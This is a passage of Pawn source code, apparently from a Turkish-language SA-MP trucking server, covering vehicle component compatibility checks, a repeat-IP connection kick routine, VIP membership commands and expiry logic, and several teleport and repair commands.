        case 421: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1016 || componentid == 1000);
        case 422: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007);
        case 426: return (componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003);
        case 429: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 436: return (componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 438: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 439: return (componentid == 1003 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1013);
        case 442: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 445: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 451: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 458: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 466: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 467: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 474: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 475: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 477: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007);
        case 478: return (componentid == 1005 || componentid == 1004 || componentid == 1012 || componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 479: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 480: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 489: return (componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016 || componentid == 1000);
        case 491: return (componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 492: return (componentid == 1005 || componentid == 1004 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1016 || componentid == 1000);
        case 496: return (componentid == 1006 || componentid == 1017 || componentid == 1007 || componentid == 1011 || componentid == 1019 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1003 || componentid == 1002 || componentid == 1142 || componentid == 1143 || componentid == 1020);
        case 500: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 506: return (componentid == 1009);
        case 507: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 516: return (componentid == 1004 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1015 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007);
        case 517: return (componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 518: return (componentid == 1005 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 526: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 527: return (componentid == 1021 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1015 || componentid == 1017 || componentid == 1007);
        case 529: return (componentid == 1012 || componentid == 1011 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 533: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 534: return (componentid == 1126 || componentid == 1127 || componentid == 1179 || componentid == 1185 || componentid == 1100 || componentid == 1123 || componentid == 1125 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1180 || componentid == 1178 || componentid == 1101 || componentid == 1122 || componentid == 1124 || componentid == 1106);
        case 535: return (componentid == 1109 || componentid == 1110 || componentid == 1113 || componentid == 1114 || componentid == 1115 || componentid == 1116 || componentid == 1117 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1120 || componentid == 1118 || componentid == 1121 || componentid == 1119);
        case 536: return (componentid == 1104 || componentid == 1105 || componentid == 1182 || componentid == 1181 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1184 || componentid == 1183 || componentid == 1128 || componentid == 1103 || componentid == 1107 || componentid == 1108);
        case 540: return (componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
        case 541: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 542: return (componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1015);
        case 545: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 546: return (componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
        case 547: return (componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1016 || componentid == 1003 || componentid == 1000);
        case 549: return (componentid == 1012 || componentid == 1011 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 550: return (componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003);
        case 551: return (componentid == 1005 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003);
        case 555: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 558: return (componentid == 1092 || componentid == 1089 || componentid == 1166 || componentid == 1165 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1168 || componentid == 1167 || componentid == 1088 || componentid == 1091 || componentid == 1164 || componentid == 1163 || componentid == 1094 || componentid == 1090 || componentid == 1095 || componentid == 1093);
        case 559: return (componentid == 1065 || componentid == 1066 || componentid == 1160 || componentid == 1173 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1159 || componentid == 1161 || componentid == 1162 || componentid == 1158 || componentid == 1067 || componentid == 1068 || componentid == 1071 || componentid == 1069 || componentid == 1072 || componentid == 1070 || componentid == 1009);
        case 560: return (componentid == 1028 || componentid == 1029 || componentid == 1169 || componentid == 1170 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1141 || componentid == 1140 || componentid == 1032 || componentid == 1033 || componentid == 1138 || componentid == 1139 || componentid == 1027 || componentid == 1026 || componentid == 1030 || componentid == 1031);
        case 561: return (componentid == 1064 || componentid == 1059 || componentid == 1155 || componentid == 1157 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1154 || componentid == 1156 || componentid == 1055 || componentid == 1061 || componentid == 1058 || componentid == 1060 || componentid == 1062 || componentid == 1056 || componentid == 1063 || componentid == 1057);
        case 562: return (componentid == 1034 || componentid == 1037 || componentid == 1171 || componentid == 1172 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1149 || componentid == 1148 || componentid == 1038 || componentid == 1035 || componentid == 1147 || componentid == 1146 || componentid == 1040 || componentid == 1036 || componentid == 1041 || componentid == 1039);
        case 565: return (componentid == 1046 || componentid == 1045 || componentid == 1153 || componentid == 1152 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1150 || componentid == 1151 || componentid == 1054 || componentid == 1053 || componentid == 1049 || componentid == 1050 || componentid == 1051 || componentid == 1047 || componentid == 1052 || componentid == 1048);
        case 566: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 567: return (componentid == 1129 || componentid == 1132 || componentid == 1189 || componentid == 1188 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1187 || componentid == 1186 || componentid == 1130 || componentid == 1131 || componentid == 1102 || componentid == 1133);
        case 575: return (componentid == 1044 || componentid == 1043 || componentid == 1174 || componentid == 1175 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1176 || componentid == 1177 || componentid == 1099 || componentid == 1042);
        case 576: return (componentid == 1136 || componentid == 1135 || componentid == 1191 || componentid == 1190 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1192 || componentid == 1193 || componentid == 1137 || componentid == 1134);
        case 579: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 580: return (componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
        case 585: return (componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 587: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 589: return (componentid == 1005 || componentid == 1004 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1024 || componentid == 1013 || componentid == 1006 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007);
        case 600: return (componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1022 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007);
        case 602: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 603: return (componentid == 1144 || componentid == 1145 || componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
    }
    return false;
}

BotControl(playerid)
{
	if(ConnectedCount == 0) { GetPlayerIp(playerid, LastConnectedIP, 50); ConnectedCount++; return 1; }
	if(ConnectedCount > 0)
	{
		new NowConnectedIP[50];
		GetPlayerIp(playerid, NowConnectedIP, 50);
		if(!strcmp(NowConnectedIP, LastConnectedIP, true))
		{
		    ConnectedCount++;
		    if(ConnectedCount == 5)
		    {
		        new RCONCMD[60];
		        format(RCONCMD, 60, "kick %s", playerid);
		        SendRconCommand(RCONCMD);
		    }
		}else{
			ConnectedCount = 1;
			format(LastConnectedIP, 50, NowConnectedIP);
		}
	}
	return 1;
}

// ************************************************************************************************************************************************************
// VIP Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
CMD:getdorse(playerid, params[])
{
	if(VIP[playerid] != 1 && YVIP[playerid] != 1) return 1;
	if(APlayerData[playerid][InConvoy] == true) return SendClientMessage(playerid, -1, "{FF0000}Konvoydayken bu komutu kullanamazsýnýz!");
	if(APlayerData[playerid][PlayerClass] != ClassTruckDriver) return 1;
	if(APlayerData[playerid][JobStarted] == false) return 1;
	if(APlayerData[playerid][TrailerID] == 0) return 1;
	new Float:oX, Float:oY, Float:oZ;
	GetPlayerPos(playerid, oX, oY, oZ);
	SetVehiclePos(APlayerData[playerid][TrailerID], oX+5.0, oY+5.0, oZ);
	SendClientMessage(playerid, -1, "{00FF00}VIP üye olarak görev dorsenizi yanýnýza çektiniz.");
	return 1;
}

CMD:teslimal(playerid, params[])
{
SendClientMessage(playerid, -1, "Bu komut artýk De-Aktif");
/*
    SendAdminText(playerid, "/teslimal", params);

	new verilecekvip, verilecekpara, verilecekskor, tmp[128];
	new handle = SQL::Open(SQL::READ, "oyuncular", "ID", APlayerData[playerid][PlayerSQLID]);
	SQL::ReadInt(handle, "verilecekvip", verilecekvip);
	SQL::ReadInt(handle, "verilecekpara", verilecekpara);
	SQL::ReadInt(handle, "verilecekskor", verilecekskor);
	SQL::Close(handle);
	
	new vipgunu = 30;

	if(vipgunu > 0)
	{
	    new year, month, day, minute, second, hour, VBParca[4][10], VIPBitT[20];
	    if(VIP[playerid] >= 1)
	    {

			split(VIPBitis[playerid], VBParca, '.');
			day = strval(VBParca[0]);
			month = strval(VBParca[1]);
			year = strval(VBParca[2]);
			hour = strval(VBParca[3]);
			format(VIPBitT, 20, GunEkle(vipgunu, day, month, year));
			format(VIPBitis[playerid], 20, "%s.%d", VIPBitT, hour);

			split(VIPBitis[playerid], VBParca, '.');
			day = strval(VBParca[0]);
			month = strval(VBParca[1]);
			year = strval(VBParca[2]);
			hour = strval(VBParca[3]);

  			format(tmp, 128, "{F8F8FF}VIP üyeliðinizi {00FF00}%d gün {F8F8FF}uzattýnýz. Bitiþ: {00FF00}%d.%d.%d Saat %d:00", verilecekvip, day, month, year, hour);
			SendClientMessage(playerid, -1, tmp);
			format(tmp, 128, "{00FF00}OYUNCU %s +%d gün {F8F8FF}VIP üyelik teslim aldý. Bitiþ: {00FF00}%d.%d.%d Saat %d:00",GetName(playerid), verilecekvip, day, month, year, hour);
			SendClientMessageToAll( -1, tmp);
		}else{
			getdate(year, month, day);
			gettime(hour, minute, second);
			#pragma unused minute
			#pragma unused second
			format(VIPBitT, 20, GunEkle(vipgunu, day, month, year));
			format(VIPBitis[playerid], 20, "%s.%d", VIPBitT, hour);

			split(VIPBitis[playerid], VBParca, '.');
			day = strval(VBParca[0]);
			month = strval(VBParca[1]);
			year = strval(VBParca[2]);
			hour = strval(VBParca[3]);

  			format(tmp, 128, "{00FF00}%d gün {F8F8FF}VIP üyelik teslim aldýnýz. Bitiþ: {00FF00}%d.%d.%d Saat %d:00", verilecekvip, day, month, year, hour);
			SendClientMessage(playerid, -1, tmp);
			format(tmp, 128, "{00FF00}OYUNCU %s %d gün {F8F8FF}VIP üyelik teslim aldý. Bitiþ: {00FF00}%d.%d.%d Saat %d:00",GetName(playerid), verilecekvip, day, month, year, hour);
			SendClientMessageToAll( -1, tmp);
	    }
	}

	if(verilecekpara > 0)
	{
	    RewardPlayer(playerid, verilecekpara, 0);
		format(tmp, 128, "{F8F8FF}Panelden satýn aldýðýnýz {00FF00}%d${F8F8FF}'ý teslim aldýnýz.", verilecekpara);
		SendClientMessage(playerid, -1, tmp);
		format(tmp, 128, "{F8F8FF}Oyuncu %s Panelden satýn aldýðý{00FF00}%d${F8F8FF}'ý teslim aldý.",GetName(playerid), verilecekpara);
		SendClientMessageToAll( -1, tmp);
	}

	if(verilecekskor > 0)
	{
	    RewardPlayer(playerid, 0, verilecekskor);
		format(tmp, 128, "{F8F8FF}Panelden satýn aldýðýnýz {00FF00}%d Skor{F8F8FF}'u teslim aldýnýz.", verilecekskor);
		SendClientMessage(playerid, -1, tmp);
		format(tmp, 128, "{F8F8FF}Oyuncu %s Panelden satýn aldýðý {00FF00}%d Skor{F8F8FF}'u teslim aldý.",GetName(playerid), verilecekskor);
		SendClientMessageToAll( -1, tmp);
	}

	if(verilecekvip == 0 && verilecekpara == 0 && verilecekskor == 0) return SendClientMessage(playerid, -1, "{FF4040}Panelden VIP, Para veya Skor satýn almamýþsýnýz. Satýn almak için Canakkale Meslek.com/panel sayfasýný ziyaret ediniz");

    handle = SQL::Open(SQL::UPDATE, "oyuncular", "ID", APlayerData[playerid][PlayerSQLID]);
	SQL::WriteInt(handle, "verilecekvip", 0);
	SQL::WriteInt(handle, "verilecekpara", 0);
	SQL::WriteInt(handle, "verilecekskor", 0);
	SQL::Close(handle);

    GivePlayerAchievement(playerid, YatirimciAch, 1); // Baþarým Sistemi

	format(tmp, 128, "[TESLIMAL] %s panelden aldigi %d gun VIP, %d$ ve %d Skoru teslim aldi.", GetName(playerid), verilecekvip, verilecekpara, verilecekskor);
	LOG(tmp);
	*/
	return 1;
}


CMD:setvip(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 6 && Root[playerid] == 0) return 0;
	new tmp[128], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendClientMessage(playerid, -1, "{F8F8FF}Kullaným: /setvip {FF0000}(Oyuncu ID) (VIP Süresi)");
	new id = strval(tmp);

	if(!IsPlayerConnected(id)) return SendClientMessage(playerid, -1, "{FF0000}Bu ID'de bir oyuncu yok!");

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendClientMessage(playerid, -1, "{F8F8FF}Kullaným: /setvip {FF0000}(Oyuncu ID) (VIP Süresi)");
	new vipgun = strval(tmp);

	new year, month, day, hour, minute, second, VIPBitT[20], VBParca[4][10];
	getdate(year, month, day);
	gettime(hour, minute, second);
	#pragma unused minute
	#pragma unused second
	format(VIPBitT, 20, GunEkle(vipgun, day, month, year));
	format(VIPBitis[id], 20, "%s.%d", VIPBitT, hour);

	split(VIPBitis[id], VBParca, '.');
	day = strval(VBParca[0]);
	month = strval(VBParca[1]);
	year = strval(VBParca[2]);
	hour = strval(VBParca[3]);

	format(tmp, 128, "{00FF00}%s, %s{F8F8FF}'in VIP üyelik süresini {00FF00}%d gün {F8F8FF}yaptý. Bitiþ: {00FF00}%d.%d.%d Saat %d:00", GetName(playerid), GetName(id), vipgun, day, month, year, hour);
	SendClientMessageToAll(-1, tmp);

	format(tmp, 128, "%s %s'e %d gün VIP verdi. Bitiþ: %s", GetName(playerid), GetName(id), vipgun, VIPBitis[id]);
	format(tmp, 1024, "%s, %d gün VIP Oldu", GetName(id), vipgun);
    SqlLogYaz(playerid, 9, tmp);
	LOG(tmp);
	return 1;
}

CMD:vipuzat(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	new tmp[128], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendClientMessage(playerid, -1, "{F8F8FF}Kullaným: /vipuzat {FF0000}(Oyuncu ID) (VIP Süresi)");
	new id = strval(tmp);

	if(!IsPlayerConnected(id)) return SendClientMessage(playerid, -1, "{FF0000}Bu ID'de bir oyuncu yok!");
	if(VIP[id] == 0) return SendClientMessage(playerid, -1, "{FF0000}Bu oyuncu VIP deðil!");

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendClientMessage(playerid, -1, "{F8F8FF}Kullaným: /vipuzat {FF0000}(Oyuncu ID) (VIP Süresi)");
	new vipgun = strval(tmp);

	new year, month, day, hour, VBParca[4][10], VIPBitT[20];
	split(VIPBitis[id], VBParca, '.');
	day = strval(VBParca[0]);
	month = strval(VBParca[1]);
	year = strval(VBParca[2]);
	hour = strval(VBParca[3]);
	format(VIPBitT, 20, GunEkle(vipgun, day, month, year));
	format(VIPBitis[id], 20, "%s.%d", VIPBitT, hour);

	split(VIPBitis[id], VBParca, '.');
	day = strval(VBParca[0]);
	month = strval(VBParca[1]);
	year = strval(VBParca[2]);
	hour = strval(VBParca[3]);

	format(tmp, 128, "{00FF00}%s, %s{F8F8FF}'in VIP üyelik süresini {00FF00}%d gün {F8F8FF}uzattý. Bitiþ: {00FF00}%d.%d.%d Saat: %d:00", GetName(playerid), GetName(id), vipgun, day, month, year, hour);
	SendClientMessageToAll(-1, tmp);

	format(tmp, 128, "%s %s'in VIPini %d gün uzatti. Bitiþ: %s", GetName(playerid), GetName(id), vipgun, VIPBitis[id]);
	LOG(tmp);
	format(tmp, 1024, "%s kiþisinin VIP üyeliði %d gün uzatýldý", GetName(id), vipgun);
    SqlLogYaz(playerid, 9, tmp);
	return 1;
}

CMD:vipgor(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 1 && Root[playerid] == 0) return 0;
	new tmp[128], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendClientMessage(playerid, -1, "{F8F8FF}Kullaným: /vipgor {FF0000}(Oyuncu ID)");
	new id = strval(tmp);

	if(!IsPlayerConnected(id)) return SendClientMessage(playerid, -1, "{FF0000}Bu ID'de bir oyuncu yok!");
	if(VIP[id] == 0) return SendClientMessage(playerid, -1, "{FF0000}Bu oyuncu VIP deðil!");

	new year, month, day, hour, VBParca[4][10];
	split(VIPBitis[id], VBParca, '.');
	day = strval(VBParca[0]);
	month = strval(VBParca[1]);
	year = strval(VBParca[2]);
	hour = strval(VBParca[3]);

	format(tmp, 128, "{FFCC00}» {FFFFFF}%s(%d){F8F8FF}'in VIP üyelik bitiþ gün ve saati: {80FFFF}%d.%d.%d Saat %d.00", GetName(id), id, day, month, year, hour);
	SendClientMessage(playerid, -1, tmp);
	return 1;
}


CMD:myskin(playerid, params[])
{
	new Msg[128], Skin;

	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (VIP[playerid] >= 1 || YVIP[playerid] == 1 || APlayerData[playerid][PlayerDonLevel] == 1)
		{
			if (sscanf(params, "i", Skin))
			SendClientMessage(playerid, 0xFF0000AA, "{F8F8FF}Kullaným: /myskin {FF0000}[Skin ID]");
			else
			{
				if ((Skin >= 0) && (Skin <= 60000))
				{
				    SetPlayerSkin(playerid, Skin);
					format(Msg, 128, "{00FF00}Yeni Skin ID'iniz: %d",Skin);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
				}
				else
					SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Hatalý Skin ID! 0-299 arasý ID girin.");
			}
		}
		else
			return 0;
	}
	else
	    return 0;

	return 1;
}

//yeni vip komutlari lisans yerine gider
CMD:ehliyetyeri(playerid, params[])
{
    if (APlayerData[playerid][JobStarted] == true) return SendClientMessage(playerid, -1, "{FF0000}Görev esnasýnda ehliyet yerine ýþýnlanamazsýnýz!");
    if(APlayerData[playerid][PlayerJailed] > 0) return SendClientMessage(playerid,-1,"{FF0000}Hapisteyken ehliyet yerine ýþýnlanamazsýnýz!");
	if (APlayerData[playerid][LoggedIn] == true)
	{
	    if (VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{

      if(APlayerData[playerid][PlayerWanted] >= 3)

        return SendClientMessage(playerid, 0xFFFFFFFF, "{ff0000}Polis tarafindan aranirken yapamassin.");

    {

        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)

        {

            new veh = GetPlayerVehicleID(playerid);

            SetVehiclePos(veh, -2034.59,  -99.27, 35.16);

            SetVehicleVirtualWorld(veh, 0);

            LinkVehicleToInterior(veh, 0);

            SetPlayerInterior(playerid, 0);

            SetPlayerVirtualWorld(playerid, 0);

            PutPlayerInVehicle(playerid, veh, 0);

            GameTextForPlayer(playerid,"~r~San Fierro Ehliyet Yerine isinlandiniz!",4500,3);

        }

        else

        {

            SetPlayerPos(playerid, -2034.59,  -99.27, 35.16);

            SetPlayerInterior(playerid, 0);

            SetPlayerVirtualWorld(playerid, 0);

            GameTextForPlayer(playerid,"~r~San Fierro Ehliyet Yerine isinlandiniz!",4500,3);

        }

    }
    }
    }

    return 1;

}
CMD:mezar(playerid, params[])
{
    if (APlayerData[playerid][JobStarted] == true) return SendClientMessage(playerid, -1, "{FF0000}Görev esnasýnda ehliyet yerine ýþýnlanamazsýnýz!");
    if(APlayerData[playerid][PlayerJailed] > 0) return SendClientMessage(playerid,-1,"{FF0000}Hapisteyken ehliyet yerine ýþýnlanamazsýnýz!");
	if (APlayerData[playerid][LoggedIn] == true)
	{
      if(APlayerData[playerid][PlayerWanted] >= 3)

        return SendClientMessage(playerid, 0xFFFFFFFF, "{ff0000}Polis tarafindan aranirken yapamassin.");

    {

        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)

        {

            new veh = GetPlayerVehicleID(playerid);

            SetVehiclePos(veh, 2539.64,  5982.78, 20.10 );

            SetVehicleVirtualWorld(veh, 0);

            LinkVehicleToInterior(veh, 0);

            SetPlayerInterior(playerid, 0);

            SetPlayerVirtualWorld(playerid, 0);

            PutPlayerInVehicle(playerid, veh, 0);

            GameTextForPlayer(playerid,"~r~Mezarlýk Ehliyet Yerine isinlandiniz!",4500,3);

        }

        else

        {

            SetPlayerPos(playerid, 2539.64,  5982.78, 20.10 );

            SetPlayerInterior(playerid, 0);

            SetPlayerVirtualWorld(playerid, 0);

            GameTextForPlayer(playerid,"~r~Mezarlýk  Yerine isinlandiniz!",4500,3);

        }

    }
    }

    return 1;

}
CMD:vtamir(playerid, params[])

{

    if (APlayerData[playerid][LoggedIn] == true)
	{
	if (VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{

    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, 0xFFFFFFFF, "{ff0000}Arac icinde degilsiniz!");

    RepairVehicle(GetPlayerVehicleID(playerid));

    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);

    SendClientMessage(playerid, 0xFFFFFFFF , "{ffff00} Araciniz Tamir edildi!");
    }
    }

    return 1;

}
CMD:vcamera(playerid, params[])

{
    if(VIP[playerid] >= 1 || YVIP[playerid] == 1)
	{
	SilahVer(playerid, 43,50);
	SendClientMessage(playerid, 0xFFFFFFFF, "Artik Kamerayla Resim cekebilirsiniz");
	}

    return 1;
}
/*hizli tamir
CMD:hizlitamir(playerid, params[])

{

    // Setup local variables
	new vID;
			    // Get the vehicleid
			    vID = GetPlayerVehicleID(playerid);
    if (APlayerData[playerid][LoggedIn] == true)
	{

    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, 0xFFFFFFFF, "{ff0000}Arac icinde degilsiniz!");
    vID = GetPlayerVehicleID(playerid);
    RepairVehicle(GetPlayerVehicleID(playerid));
    // Refuel the vehicle
    AVehicleData[vID][Fuel] = MaxFuel;
    RewardPlayer(playerid, -7000, 0);
    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);

    SendClientMessage(playerid, 0xFFFFFFFF , "{ffff00} Hizli Tamir Yöntemini sectiniz ve Hesabinizdan 5000 $ Cekildi + 2000 $ Benzin!");
    }

    return 1;

}*/

VIPControl(playerid)
{
	if(!strcmp(VIPBitis[playerid], "Yok", true)) return 1;

	new BolunenBilgi[4][10], year, month, day, hour, minute, second;
	getdate(year, month, day);
	gettime(hour, minute, second);
	#pragma unused minute
	#pragma unused second
	split(VIPBitis[playerid], BolunenBilgi, '.');

	if(year > strval(BolunenBilgi[2]))
	{
 		VIP[playerid] = 0;
 		format(VIPBitis[playerid], 20, "Yok");
   		SendClientMessage(playerid, -1, "{F8F8FF}VIP üyeliðiniz sona ermiþtir.");
	}else if(year == strval(BolunenBilgi[2]))
	{
 		if(month > strval(BolunenBilgi[1]))
   		{
    		VIP[playerid] = 0;
      		format(VIPBitis[playerid], 20, "Yok");
	    	SendClientMessage(playerid, -1, "{F8F8FF}VIP üyeliðiniz sona ermiþtir.");
		}else if(month == strval(BolunenBilgi[1]))
		{
  			if(day > strval(BolunenBilgi[0]))
	    	{
    			VIP[playerid] = 0;
       			format(VIPBitis[playerid], 20, "Yok");
	    		SendClientMessage(playerid, -1, "{F8F8FF}VIP üyeliðiniz sona ermiþtir.");
			}else if(day == strval(BolunenBilgi[0]))
			{
		        if(hour >= strval(BolunenBilgi[3]))
		        {
	    			VIP[playerid] = 0;
	       			format(VIPBitis[playerid], 20, "Yok");
		    		SendClientMessage(playerid, -1, "{F8F8FF}VIP üyeliðiniz sona ermiþtir.");
		        }else{
		            VIP[playerid] = 1;
		        }
		    }else{
                VIP[playerid] = 1;
    		}
		}else{
			VIP[playerid] = 1;
		}
	}else{
		VIP[playerid] = 1;
	}
	return 1;
}


// ************************************************************************************************************************************************************
// Anti Teleport Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
/*forward TeleportPlayer(playerid, Float:X, Float:Y, Float:Z);
public TeleportPlayer(playerid, Float:X, Float:Y, Float:Z)
{
